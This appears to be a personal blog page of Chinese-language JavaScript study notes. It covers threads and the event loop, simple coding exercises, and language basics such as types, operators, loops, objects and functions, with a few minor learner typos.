<h4 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程:"></a>进程与线程:</h4><p>进程:程序的一次执行,它占有一片独有的内存空间<br>可以通过windows任务管理器（ctrl + alt+delete）查看</p>
<p>线程:是进程内的一个独立执行单元，<br>是程序执行的一个完整流程】<br>是CPU的最小调度单元</p>
<p>首先  应用程序存储在硬盘上，然后启动程序A或程序B，程序一启动就会有启动它对应的一个或多个进程，每一个进程会有对应的一个或多个线程</p>
<p>一个进程如果有多个线程 称为多线程程序,如果只有一个线程，则称为单线程程序,单线程与多线程局限在一个进程内。</p>
<p>chrome是多进程(可以同时启动多个进程)，但不是所用应用都是多进程</p>
<p>应用程序必须运行在某个进程的某个线程上<br>一个进程中至少会有一个运行的线程:主线程(这里主线程只会有一个)，进程启动后自动创建<br>一个进程中也可以同时运行多个线程<br>一个进程内的数据可以供其中的多个线程直接共享<br>多个进程之间的数据是不能直接共享的</p>
<p>线程池:保存多个线程对象的容器，实现线程对象的反复利用。</p>
<p>多进程与多线程:<br>多进程:一个应用程序可以同时启动多个实例运行(启动多个进程)<br>多线程:在一个进程内，同时有多个线程运行</p>
<p>比较单线程与多线程:<br>多线程：<br>优点 能有效提高CPU的利用率</p>
<p>缺点:创建多线程有开销<br>线程间切换也有开销<br>死锁与状态同步问题</p>
<p>单线程:<br>优点:<br>顺序编程简单易懂</p>
<p>缺点:<br>效率低</p>
<p>多个线程不一定就同时执行(如单核:创建多个线程   一个线程中执行一会儿，暂停后，另外的线程)<br>执行一会儿，暂停,….这样反复下去，在两个线程之间跳转运行）</p>
<p>js是单线程还是多线程?<br>js是单线程运行的<br>但使用H5(即html5的规范 包含html5的 css的一些样式 js的一些新语法)的Web Workers可以多线程运行</p>
<p>浏览器运行是单线程还是多线程?<br>都是多线程运行</p>
<p>浏览器运行是单进程还是多进程?<br>有多进程也有单进程的<br>单进程:firefox<br>老版IE</p>
<p>多进程:chrome<br>新版IE</p>
<h4 id="js是单线程执行的"><a href="#js是单线程执行的" class="headerlink" title="js是单线程执行的:"></a>js是单线程执行的:</h4><p>如何证明:<br>setTimeout的回调函数是在主线程执行的<br>定时器回调函数只有在运行栈中的代码全部执行完后才会有可能执行</p>
<p>(alert() 暂停当前主线程的执行 同时暂停计时，点击确定后，恢复程序执行和计时)</p>
<h4 id="为什么js要用单线程模式？而不用多线程模式"><a href="#为什么js要用单线程模式？而不用多线程模式" class="headerlink" title="为什么js要用单线程模式？而不用多线程模式?"></a>为什么js要用单线程模式？而不用多线程模式?</h4><p>如果是多线程<br>现在如果页面中有一个p标签，线程1是对p标签进行添加文本  线程2是对p进行删除操作 线程1添加文本的时候时间交给了线程2 线程2删除了p标签后再交给线程1运行 此时1是看不到p的，所以会出问题</p>
<p>（只会允许有一个线程去更新界面）</p>
<h4 id="事件循环模型"><a href="#事件循环模型" class="headerlink" title="事件循环模型:"></a>事件循环模型:</h4><p>代码的分类:<br>初始化执行代码(同步代码):包含绑定dom事件监听,设置计时器,发送ajax请求的代码（应该不包括里面的回调函数）<br>回调执行代码(异步代码):负责回调逻辑</p>
<p>js引擎执行代码的基本流程:<br>（js引擎是在主线程）<br>先执行初始化代码:包含一些特殊的代码<br>如:设置计时器<br>   绑定事件监听<br>   发送ajax请求<br>后面在某个时刻才会执行回调代码<br>（异步代码:只有当初始化代码执行完成以后，才有可能执行(看时间))</p>
<p>模型的2个重要组成:<br>事件(定时器&#x2F;dom事件&#x2F;ajax)管理模块<br>回调队列</p>
<p>模型的运转流程:<br>执行初始化代码,将事件回调函数交给对应模块管理<br>当事件发生时,管理模块会将回调函数及其数据添加到回调队列中<br>只有当初始化代码执行完后(可能要一定时间),才会遍历读取回调队列(起到一个缓存的作用)中的回调函数执行</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/02/25/js2/" data-id="cl1dgisug0005ngno4l9raoyr" data-title="js2" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-计算题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/02/25/%E8%AE%A1%E7%AE%97%E9%A2%98/" class="article-date">
  <time class="dt-published" datetime="2022-02-25T09:01:26.000Z" itemprop="datePublished">2022-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/02/25/%E8%AE%A1%E7%AE%97%E9%A2%98/">计算题</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="去除数组中重复的数字"><a href="#去除数组中重复的数字" class="headerlink" title="去除数组中重复的数字:"></a>去除数组中重复的数字:</h4><p>for(var i&#x3D;0;i&lt;arr.length;i++){<br>for(var j&#x3D;i+1;j&lt;arr.length;j++){<br>if(arr[i]&#x3D;&#x3D;arr[j]){<br>arr.splice(j,1);<br>j–；此处防止出现 连续重复性数字造成漏检<br>}<br>}<br>}<br><br/></p>
<h4 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序:"></a>数组排序:</h4><p>arr.sort(function(a,b){<br>如果升序<br>if(a&gt;b){<br>return 1（a-b）;<br>}else if(a&lt;b){<br>return -1（a-b）;<br>}else{<br>return 0<br>}<br>如果降序:<br>if(a&gt;b){<br>return -1（b-a);<br>}else if(a&lt;b){<br>return 1（b-a）;<br>}else {<br>return 0;<br>}<br><br/></p>
<h4 id="判断一个数是否是质数"><a href="#判断一个数是否是质数" class="headerlink" title="判断一个数是否是质数:"></a>判断一个数是否是质数:</h4><p>质数:只能被1和它自身整除的数，1不是质数也不是和数，质数必须是大于1的自然数。<br>var num&#x3D;prompt(“请输入一个数”);<br>var flag&#x3D;true;<br>if(num&lt;1){<br>alert(“请输入一个小于1的数”);<br>}else{<br>for(var i&#x3D;2;i&lt;num;i++){<br>&#x2F;&#x2F;优化:i&lt;&#x3D;Math.sqrt(num)  可以对一个数开方<br>if(num%i&#x3D;&#x3D;0){<br>flag&#x3D;false;  &#x2F;&#x2F;如果num能将一个数除断,就不是一个质数<br>&#x2F;&#x2F;优化：加一个break;减少时间<br>}<br>}<br>if(flag){<br>alert(num+”是一个质数”);&#x2F;&#x2F;说明上面的num%i一直都没有除断,所以flag为false一直没执行<br>}else{<br>alert(num+”不是一个质数”);<br>}<br><br/></p>
<h4 id="将三个数按从小到大排列"><a href="#将三个数按从小到大排列" class="headerlink" title="将三个数按从小到大排列:"></a>将三个数按从小到大排列:</h4><p>注:prompt返回的是一个字符串<br>var num1&#x3D;+prompt(“请输入一个数”);<br>var num2&#x3D;+prompt(“请输入第二个数”);<br>var num3&#x3D;+prompt(“请输入第三个数”);<br>if(num1&lt;num2&amp;&amp;num1&lt;num3){<br>&#x2F;&#x2F;如果num1最小<br>if(num2&lt;num3)<br>alert(num1,num2,num3)<br>else alert(num1,num3,num2);<br>}</p>
<p>else if(num2&lt;num1&amp;&amp;num2&lt;num3){<br>&#x2F;&#x2F;如果num2最小<br>…<br>}</p>
<p>else{<br>&#x2F;&#x2F;num3最小<br>…<br>}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/02/25/%E8%AE%A1%E7%AE%97%E9%A2%98/" data-id="cl1dgisuk0008ngnock94479t" data-title="计算题" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-js1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/02/14/js1/" class="article-date">
  <time class="dt-published" datetime="2022-02-14T10:40:51.000Z" itemprop="datePublished">2022-02-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/02/14/js1/">js1</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="JS编写的位置"><a href="#JS编写的位置" class="headerlink" title="JS编写的位置:"></a>JS编写的位置:</h4><p>可写在外部文件中，然后引入<br>script type&#x3D;”text&#x2F;javascript” src&#x3D;”js&#x2F;script.js”</p>
<p>也可以写在script  &#x2F;script</p>
<p>还可以 button onclick&#x3D;””<br><br/></p>
<h4 id="字面量与变量"><a href="#字面量与变量" class="headerlink" title="字面量与变量:"></a>字面量与变量:</h4><p>字面量都是一些不可改变的值 如 1，2，3</p>
<p>变量可以用来保存字面量，变量的值是可以任意改变的</p>
<p>声明变量  var a;<br><br/></p>
<h4 id="标识符"><a href="#标识符" class="headerlink" title="标识符:"></a>标识符:</h4><p>js中所有可以由我们自主命名的都可以称为标识符</p>
<p>1 标识符可以含有 字母，数字，_,$,<br>2 标识符不能以数字开头<br>3 标识符不能是ES中的关键字(如:var,if)和保留字(如extend,class)<br>4 标识符一般采用驼峰命名法<br>  首字母小写，每个单词的开头字母大写，其余字母小写<br>如 helloworld<br>   helloWorld<br><br/></p>
<h4 id="数据类型："><a href="#数据类型：" class="headerlink" title="数据类型："></a>数据类型：</h4><p>数据类型指的就是字面量的类型<br>String 字符串<br>Number 数字<br>Boolean 布尔值<br>Null 空值<br>Undefined 未定义 6个基本<br>Symbol</p>
<p>Object 对象 一个引用</p>
<p>基本(值)类型:<br>string  number Boolean undefined null</p>
<p>对象(引用)类型:<br>Object:任意对象<br>Function:一种特别的对象(可以执行)<br>Array：一种特别的对象(数值下标,内部数据是有序的)</p>
<p>instanceof 判断对象的具体类型</p>
<p>typeof null ：  “object”<br>typeof undefined : “undefined”<br>typeof 函数名: “function”</p>
<p>typeof 可以判断： 数字 字符串 布尔值 undefined function<br>无法判断null和object object与array<br><br/></p>
<h4 id="String字符串"><a href="#String字符串" class="headerlink" title="String字符串:"></a>String字符串:</h4><p>JS中字符串需要用引号引起来<br>使用双引号或单引号都可以，但同种引号不要混着用<br>在字符串中可以使用\作为转义字符<br>&quot; 表示 “<br>&#39;表示’<br>\n表示换行<br>\表示<br><br/></p>
<h4 id="Number类型"><a href="#Number类型" class="headerlink" title="Number类型:"></a>Number类型:</h4><p>在JS中所有数值都是Number类型<br>包括整数和浮点数(小数)<br>JS中用来表示数字的最大值Number.MAX_VALUE<br>如果超过了最大值的大小则为Infinity字面量正无穷大,这个也是Number类型<br>NaN的类型也是Number,表示not a number不是一个数字<br>Number.MIN_VALUE表示0以上的最小值<br><br/></p>
<h4 id="Boolean类型"><a href="#Boolean类型" class="headerlink" title="Boolean类型:"></a>Boolean类型:</h4><p>值只有两个，主要用来逻辑判断<br>true 真<br>false 假<br><br/></p>
<h4 id="null和undefined"><a href="#null和undefined" class="headerlink" title="null和undefined:"></a>null和undefined:</h4><p>null这个值专门用来表示一个空对象 typeof null 结果是 object<br>undefined 表示 声明一个变量，但是没有赋值 typeof undefined结果为undefined<br>null转成数字为0<br>undefined转成数字为NaN<br><br/></p>
<h4 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换:"></a>强制类型转换:</h4><p>将其他数据类型转换为String：<br>.toString()方法 不会影响原变量，但会将结果返回<br>null和undefined没有toString()方法，但可用下面的函数转换<br>调用String()函数</p>
<p>将其他数据类型转换为Number<br>转换方式一:<br>使用Number()函数<br>字符串转成数字:<br>1 如果是纯数字的字符串,则直接将其转换成数字<br>2 如果字符串中有非数字的内容，则直接转成NaN<br>3 如果字符串是空串或者里面全部都是空格，则转成0</p>
<p>布尔转成数字<br>true 1<br>false 0</p>
<p>null转成数字为0<br>undefined转成数字为NaN</p>
<p>转换方式二:<br>parseInt()函数 parseInt可以将一个字符串中的有效数字读取出来，然后转换成Number类型，但如果第一位就是非数字，name直接转为NaN<br>parseFloat()函数  parseFloat和parseInt类似，不同的是 parseFloat还可以获得有效的小数<br>对于非String类型使用parseInt或者parseFloat，会将其先转成字符串，然后再转成Number</p>
<p>将其他类型转成Boolean类型:<br>数字中：0和NaN转布尔都是false<br>字符串中:只有空串(“”)转布尔为false<br>null和undefined转布尔都为false<br><br/></p>
<h4 id="其他进制的数"><a href="#其他进制的数" class="headerlink" title="其他进制的数:"></a>其他进制的数:</h4><p>在js中，如果要表示16进制的数，需要以0x开头<br>var a&#x3D;0x10 结果为16</p>
<p>如果要表示8进制的数，需要以0开头<br>var a&#x3D;070 结果为56</p>
<p>如果要标识2进制的数，需要以0b开头<br>var a&#x3D;0b10 结果为 2</p>
<p>像var a&#x3D;”070”<br>parseInt(a);<br>这种字符串有的浏览器当成8进制，有的当成10进制度</p>
<p>解决方法:<br>parseInt(a,10)第一个表示参数，第二个表示进制<br><br/></p>
<h4 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符:"></a>算数运算符:</h4><p>+：对于非Number类型的进行计算，会将其转换为number类型，然后进行计算，并将结果返回。<br>任何值和NaN计算都为NaN(若是字符串相加除外)<br>任何一个值和字符串相加，都会将其先转换为字符串，然后进行拼串。<br>var a&#x3D;1;<br>a&#x3D;1+””;<br>结果为字符串1，这里是虽然是隐式转换，但过程中还是用到了 String（）函数</p>
<p>-,<em>,&#x2F;:<br>会将参与计算的值都转换为number类型，然后计算。<br>var a&#x3D;”1”;<br>a&#x3D;a-0;<br>a&#x3D;a</em>1;<br>a&#x3D;a&#x2F;1;<br>结果为Number类型的1,可以做隐式的类型转换。</p>
<p>%：取余。<br><br/></p>
<h4 id="一元运算符"><a href="#一元运算符" class="headerlink" title="一元运算符:"></a>一元运算符:</h4><p>只需要一个操作数<br>var a&#x3D;1;<br>console.log(+a);1 没有影响</p>
<p>var a&#x3D;1;<br>console.log(-a);-1 有影响</p>
<p>都会将非number类型的值转换为Number类型，<br>var a&#x3D;false;<br>console.log(+a)；0；</p>
<p>可以用+a;来做隐式转换成number类型(原理和Number()函数一样)<br><br/></p>
<h4 id="自增与自减"><a href="#自增与自减" class="headerlink" title="自增与自减:"></a>自增与自减:</h4><p>var a&#x3D;1;<br>a++;此时 表达式 的值是1<br>console.log(a):这里变成2;<br>对于一个变量自增以后，原变量的值会立即增加1;<br>无论是a++,还是++a,都会立即让原来的变量值加1，区别是a++这个表达式的值是自增以前的值，<br>而++a这个表达式的值是自增以后的值。<br>var a&#x3D;20;<br>var a&#x3D;a++;<br>等价于 var e&#x3D;a++;<br>a&#x3D;e;<br>a的结果还是20;<br><br/></p>
<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符:"></a>逻辑运算符:</h4><p>! 非运算符:对一个布尔值进行取反操作，false变成true,true变成false,<br>不会改变原来变量的值，<br>var a&#x3D;true;<br>console.log(!a);false;<br>console.log(a);true;<br>对于非布尔值取反，会将其先转换为布尔值，然后取反。<br>可以取两次反，将一个非布尔类型的值转换为布尔类型的值，并且不改变原值<br>var a&#x3D;1;<br>a&#x3D;!!a;true;</p>
<p>&amp;&amp; 与运算符:<br>a&amp;&amp;b;<br>只有两个值都为true,结果才是true;<br>如果有一个值为false,结果就是false;<br>如果第一个值为false,则不会再看第二个值</p>
<p>|| 或运算符:<br>只有两个值都为false,才返回false<br>若需其中一个值为true,就会返回true<br>如果第一个值为true,则不会再去看第二值<br><br/></p>
<h4 id="非布尔值的与或运算"><a href="#非布尔值的与或运算" class="headerlink" title="非布尔值的与或运算:"></a>非布尔值的与或运算:</h4><p>会将其转换成布尔值，然后进行运算,并且返回原值。<br>2&amp;&amp;1  1<br>1&amp;&amp;2  2<br>如果两个值都为true,则返回后面的。<br>0&amp;&amp;2<br>flase&amp;&amp;true<br>返回 0<br>2&amp;&amp;0  0<br>NaN&amp;&amp;0  NaN<br>0&amp;&amp;NaN  0<br>如果两个值中有false,则返回靠前的false<br>如果第一个值为true,则必然返回第二个值<br>如果第一个值为false，则直接返回第一个值<br><br/><br>2||1 2 如果第一个值为true,则直接返回第一个值<br>NaN||1  1  如果第一个值为false,则直接返回第二个值<br><br/></p>
<h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符:"></a>赋值运算符:</h4><p>&#x3D;:可以将符号右侧的值赋值给符号左侧的变量<br>a +&#x3D;5 等价于 a&#x3D;a+5<br>a -&#x3D;5 等价于 a&#x3D;a-5<br>a %&#x3D;5 等价于 a&#x3D;a%5<br><br/></p>
<h4 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符:"></a>关系运算符:</h4><p>比较两个值的大小，如果成立返回true,不成立返回false<br>4&gt;5 false<br>5&gt;&#x3D;5(大于或者等于 满足其一就成立) true<br>1&gt;”0” true  对于非数字进行比较时，会将其转换为数字然后进行比较。<br>10&lt;&#x3D;”hello” 任何值和NaN做比较都是false<br>“11”&lt;”5” true 特殊情况:如果两边都是字符串，不会将其转成数字比较，而会分别比较字符串中的Unicode编码<br>“abc”&lt;”b” true 比较字符编码时是一位一位进行比较,第一位a比b小，后面就不看了<br>“bbc”&lt;”b” false  第一位两边一样，比较下一位，第二位 左边是b 右侧没有 左边大<br><br/></p>
<h4 id="Unicode编码表的使用"><a href="#Unicode编码表的使用" class="headerlink" title="Unicode编码表的使用:"></a>Unicode编码表的使用:</h4><p>在字符串中使用转义字符使用Unicode编码:console.log(“\u0054”);<br>在网页中使用Unicode编码:&amp;#编码 这里的编码需要的是10进制<br><br/></p>
<h4 id="相等运算符"><a href="#相等运算符" class="headerlink" title="相等运算符:"></a>相等运算符:</h4><p>&#x3D;&#x3D;  比较两个值是否相等，相等则返回true,否则返回false<br>4&#x3D;&#x3D;5 false<br>“1”&#x3D;&#x3D;1 true  如果两边的类型不同，  大部分情况都会转换为数字<br>true&#x3D;&#x3D;”1”  true  左边布尔转数字 1  右侧字符串也转成数字1<br>null&#x3D;&#x3D;0 false  左边null没有转成数字<br>undefined&#x3D;&#x3D;null true undefined衍生于null<br>NaN&#x3D;&#x3D;NaN  false NaN不和任何值相等，包括它本身</p>
<p>检查一个值是否是NaN,如果是NaN返回true,否则返回false<br>isNaN(NaN) true<br>isNaN(1)   false<br>!&#x3D; 用来判断两个值是否不相等，不相等返回true 相等返回false</p>
<p>&#x3D;&#x3D;&#x3D; 全等 用来判断两个值是否全等 若两边值的类型不同，则直接返回false，不会自动做类型转换。<br>“123”&#x3D;&#x3D;123 false<br>“123”&#x3D;&#x3D;123 true<br>null&#x3D;&#x3D;&#x3D;undefined  false  null与undefined相等但不全等</p>
<p>！&#x3D;&#x3D; 不全等  如果两个值的类型不同，直接返回true<br>1!&#x3D;&#x3D;”1” true<br><br/></p>
<h4 id="条件运算符"><a href="#条件运算符" class="headerlink" title="条件运算符:"></a>条件运算符:</h4><p>语法：<br>条件表达式？语句1:语句2;<br>首先对条件表达式进行求值,若为true，则执行语句1，并返回结果,否则执行语句2，并返回结果。<br>var a&#x3D;1,b&#x3D;2;<br>a&gt;b?alert(“a大”)：alert(“b大”);<br>获取 a和b中的最大值<br>var max&#x3D;a&gt;b?a:b;<br>获取abc中的最大值<br>max&#x3D;max&gt;c?max:c;<br>或者<br>max&#x3D;a&gt;b?(a&gt;max?a:c):(b&gt;c?b:c);<br>如果条件表达式的求值为一个非布尔值，则会将其转换为布尔值，<br>“”?alert(1):alert(2);2<br>“1”?alert(1):alert(2); 1</p>
<p>if(a&#x3D;10) 表示  if(10) 即 if(true)<br><br/></p>
<h4 id="优先级"><a href="#优先级" class="headerlink" title="优先级:"></a>优先级:</h4><p>, 运算符  可用来同时声明多个变量<br>var a,b,c;<br>1+2*3  先乘除后加减<br>1||2&amp;&amp;3  1如果或的优先级高先算或，如果与的优先级高先算与，如果两个一样高，则按从左往右的顺序<br>这里  &amp;&amp;的优先级比||高<br>可以通过()改变优先级 (1||2)&amp;&amp;3  3<br><br/></p>
<h4 id="代码块"><a href="#代码块" class="headerlink" title="代码块:"></a>代码块:</h4><p>程序是一条一条语句构成的,<br>语句是按照自上向下的顺序一条一条执行的<br>同一个{}中的语句称为一组语句，他们要么都执行，要么都不执行<br>{<br>alert(0);<br>console.log(1);<br>}  这里与不加{}没有区别<br>一个{}中的语句也称为一个代码块<br>在代码块的后边就不用再编写;了<br>JS中的代码块{}只具有分组的作用，没有其他用途。<br>在代码块中的内容，在外部是完全可见的<br><br/></p>
<h4 id="if语句"><a href="#if语句" class="headerlink" title="if语句:"></a>if语句:</h4><p>if(条件表达式)<br>语句<br>if语句在执行时 会先对条件表达式进行判断<br>如果为 true 则执行if后的语句，若为false 则不执行if后的语句。<br>var a&#x3D;10;<br>if(a&gt;10） if语句只能控制紧随其后的那个语句。<br>alert(1);<br>alert(2);这句还是会执行<br>如果希望if语句可以同时控制多条语句，可以将他们放在代码块{}中<br>if(a&gt;10){<br>alert(1);<br>alert(2);<br>}<br>if…else if…else  会从上到下依次对条件表达式进行求值判断,如果所有条件都不满足，则执行<br>最后一个else后的语句。<br>该语句中，只会有一个代码块被执行，一旦代码块执行了，则直接结束语句。<br>if(a&gt;10){<br>console.log（10）；<br>}else if(a&gt;5){<br>console.log(5);<br>}else if(a&gt;3){<br>console.log(3);<br>}else{<br>console.log(0);<br>}<br><br/></p>
<h4 id="条件分支语句"><a href="#条件分支语句" class="headerlink" title="条件分支语句:"></a>条件分支语句:</h4><p>switch(条件表达式){<br>case 表达式:<br>语句 …<br>break; 这三行可以有多个<br>default:<br>语句 …<br>break;<br>}</p>
<p>在执行时会依次将case后面的表达式的值和switch后面的表达式的值进行 全等 比较<br>如果比较的结果为true,则从当前case处开始执行代码，当前case后的代码都会执行<br>如果比较结果为false,则继续向下比较<br>使用break可以退出switch语句<br>如果所有的比较结果都为false,则只执行default后的语句</p>
<p>var a&#x3D;1;<br>switch(a){<br>case 1:<br>console.log(“1”);<br>break;<br>}<br><br/></p>
<h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环:"></a>while循环:</h4><p>while(条件表达式){<br>}<br>先对条件表达式进行求值判断<br>如果值为true,则执行循环体<br>循环体执行完以后，继续对表达式进行判断<br>如果为true,则继续执行循环体，以此类推<br>如果值为false，则终止循环</p>
<p>while(true){  这个称为死循环<br>alert(n++)；<br>break;可以使用break终止循环<br>} </p>
<p>do…while循环<br>先执行循环体，判断，继续执行循环体，然后判断,以此类推。<br>如果结果为false,则终止循环。<br>do{<br>语句…<br>}while（条件表达式）</p>
<h4 id="for循环"><a href="#for循环" class="headerlink" title="for循环:"></a>for循环:</h4><p>求水仙花数：<br>for(var i&#x3D;100;i&lt;1000;i++){<br>var bai&#x3D;parseInt(i&#x2F;100); &#x2F;&#x2F;获取百位上的数字<br>var shi&#x3D;parseInt((i-bi*100)&#x2F;10);&#x2F;&#x2F;获取十位上的数字<br>var ge&#x3D;i%10;<br>if(bai*bai*bai+shi*shi*shi+ge*ge*ge&#x3D;&#x3D;i){<br>console.log(i);<br>}<br>}<br><br/></p>
<p>嵌套联系:<br>for(var i&#x3D;0;i&lt;5;i++){&#x2F;&#x2F;控制行的个数<br>i值改变一次前，j值会该改变i次<br>for(var j&#x3D;0;j&lt;&#x3D;i;j++){&#x2F;&#x2F;控制每一行显示的个数<br>document.write(“*”);<br>}<br>document.write(“<br/>“);<br>}<br><br/></p>
<h4 id="break与continue"><a href="#break与continue" class="headerlink" title="break与continue:"></a>break与continue:</h4><p>break关键字只能又来退出switch或循环语句<br>不能在if语句中使用break和continue<br>break会终止离他最近的循环语句</p>
<p>可以在break后跟一个label（随便一个标签）,可以终止指定的循环<br>outer：<br>for(…){<br>for(…){<br>break outer;</p>
<p>continue可以用来跳过当次循环<br>continue默认只会对离他最近的循环起作用<br><br/></p>
<h4 id="测试程序执行的时间"><a href="#测试程序执行的时间" class="headerlink" title="测试程序执行的时间:"></a>测试程序执行的时间:</h4><p>程序执行前，开启计时器<br>console.time(“test”);text为计时器的名字<br>…<br>console.timeEnd(“test”);终止计时器</p>
<p>或者<br>var start&#x3D;Date.now();得到的是毫秒</p>
<p>然后再回调里面  用Date.now-start<br><br/></p>
<h4 id="对象"><a href="#对象" class="headerlink" title="对象:"></a>对象:</h4><p>对象属于一种复合的数据类型，在对象中可以保存多个不同数据类型的属性<br>分类:<br>1 内建对象:由ES标准标准中定义的对象，在任何的ES的实现中都可以使用<br>例如:Math,String,Number,Boolean,Function,Object,…<br>2 宿主对象:由JS的运行环境提供的对象，主要指浏览器提供的对象<br>  比如 BOM,DOM<br>  console.log()中console<br>  document.write()中的document<br>3 自建对象；由开发人员自己建立的对象<br>var obj&#x3D;new Object() 使用new关键字调用的函数，是构造函数constructor，构造函数是专门用来创建对象的函数<br>使用typeof 检查一个对象时,会返回一个object<br>对象中保存的指称为属性<br>向对象添加属性<br>语法:对象.属性名&#x3D;属性值<br>obj.name&#x3D;”孙猴子<br>读取对象中的属性:对象.属性名 obj.name<br>如果读取对象中没有的属性，不会报错，而是返回undefined<br>修改对象的属性值: obj.name&#x3D;”八戒<br>删除对象的属性 delete obj.name;<br>如果要存入特殊的属性名，不能采用 . 的方式来操作,而应该这样<br>obj[“123”]&#x3D;”monkey”<br>取的时候也必须是 obj[“123”]</p>
<p>还可以  var n&#x3D;”123”<br>obj[n]的值还是一样(读取时还是obj[“123”])</p>
<p>in 运算符<br>通过该运算符可以检查一个对象中是否含有指定的属性<br>如果由返回true,没有则返回false<br>语法:”属性名” in 对象<br>“name” in obj   true<br>“test” in obj   false</p>
<p>对象的属性值也可以是个函数,这是函数可以认为是这个对象的方法<br>obj.sayName&#x3D;function(){}<br>obj.sayName()；调方法</p>
<p>function fun(){}<br>fun();调函数</p>
<p>var obj&#x3D;{<br>sayName:function（）{}<br>}</p>
<p>枚举对象中的属性:<br>for（var 变量 in 对象）{}<br>有多少属性，循环体就执行多少次</p>
<p>变量为每次执行的属性名字<br>对象[变量] 来取每次的属性值,而对象.变量的方式不能采取<br><br/></p>
<h4 id="基本数据类型和引用数据类型"><a href="#基本数据类型和引用数据类型" class="headerlink" title="基本数据类型和引用数据类型:"></a>基本数据类型和引用数据类型:</h4><p>JS中的变量都是保存在栈内存中<br>基本数据类型的值直接在栈内存中存储<br>值与值之间是独立存在的，修改一个变量不会影响其他的变量<br>var a&#x3D;123;<br>var b&#x3D;a;<br>过程如下<br>在栈内存中<br>变量  值<br>a     123<br>b     123 （这里的123是直接复制上面的123）<br>然后a++<br>a 124<br>b  123 不会对a有任何影响</p>
<p>对象是保存在堆内存中的<br>var obj&#x3D; new Object()  出现new 意味着在堆中开辟了一个空间，用来存储对象<br>栈内存中<br>变量 值<br>obj  0x123 这里变量保存的是一个内存地址(对象引用) 这里相当于一个指针，执行了堆内存中指定的空间</p>
<p>堆内存中<br>一部分空间  地址为0x123..<br>obj.name&#x3D;”孙猴子” 此时在堆内存指定的空间里存入数据</p>
<p>var obj2&#x3D;obj;<br>栈内存中<br>obj  0x123…<br>obj2 ox123…(此时变量值 为 从上面复制过来的地址) 此时指向的是同一个对象</p>
<p>若 obj2&#x3D;null<br>此时obj2和堆中的对象链接断开了，但不会影响obj<br><br/></p>
<h4 id="对象字面量："><a href="#对象字面量：" class="headerlink" title="对象字面量："></a>对象字面量：</h4><p>使用对象字面量创建对象，可以直接指定对象中的属性<br>var obj&#x3D;{}<br>语法:{属性名:属性值,…}<br>对象字面量的属性名可以加引号，也可以不加，建议不加<br>但如果使用特殊的属性名，需要加上引号，如 {“!#$@#”：”00”}<br>如果一个属性之后没有其他的属性了，就不要加逗号了<br><br/></p>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数:"></a>函数:</h4><p>函数也是一个对象<br>函数中可以封装一些功能代码,在需要时可以执行这些功能(代码)<br>创建一个函数对象<br>var fun&#x3D;new Function()<br>console.log(typeof fun)  “function”<br>可以将要封装的代码以字符串的形式传递给构造函数<br>var fun&#x3D;new Function(“console.log(‘你是八戒吗’)”)<br>封装到函数中的代码不会立即执行<br>调用函数的语法:<br>函数对象+()</p>
<p>也可以 使用函数声明来创建一个函数<br>语法:<br>function 函数名(形参1,形参2,…,形参N,){<br>语句…<br>}</p>
<p>还可以  使用函数表达式（匿名函数）来创建一个函数<br>var 函数名&#x3D;function(形参1,形参2,…形参N){};</p>
<p>var fun3&#x3D;function(){console.log(“你是一个函数”);};<br>使用return可以结束整个函数<br>返回值可以是任意的数据类型，可以是一个对象，也可以是一个函数<br><br/></p>
<h4 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数:"></a>函数参数:</h4><p>可以在函数的()指定一个或多个形参(形式参数)<br>多个形参之间使用,隔开<br>声明形参就相当于在函数内部声明了对应的变量<br>function sum(a,b){}<br>相当于 function sum(a,b){var a;var b;}<br>在调用函数时,可以在()中指定实参(实际参数)<br>实参将会赋值给函数中对应的形参<br>sum(1,2）<br>相当于<br>function sum(a,b){var a&#x3D;1;var b&#x3D;2;}</p>
<p>调用函数时，解析器不会检查实参的类型，<br>所以要注意，是否有可能接收到非法的参数，如果有可能，需要对参数进行一个类型的检查<br>调用函数时，解析器也不会检查是实参的数量</p>
<p>多余实参不会被赋值<br>如果实参的数量少于形参的数量，则没有对应实参的形参将是undefined<br>函数的实参可以是任何的数据类型</p>
<p>return 后的值将作为函数的执行结果返回<br>在函数中 return 语句之后的语句都不会执行<br>如果return 后面不跟任何值，就相当于返回了undefined<br>如果函数中不写return,也相当于返回了undefined</p>
<p>当参数过多时，可以将他们封装到一个对象中进行传递<br>实参可以是一个对象，也可以是一个函数<br>sum() 调用函数 相当于使用函数的返回值<br>sum 函数对象<br><br/></p>
<h4 id="立即执行函数"><a href="#立即执行函数" class="headerlink" title="立即执行函数:"></a>立即执行函数:</h4><p>也称为 匿名函数自调用，IIEF<br>函数定义完，立即被调用<br>立即执行函数往往只会执行一次<br>(function(a,b){<br>var a&#x3D;10;<br>}<br>)(1,2)<br>好处：<br>不会影响全局命名空间<br>隐藏内部实现<br><br/></p>
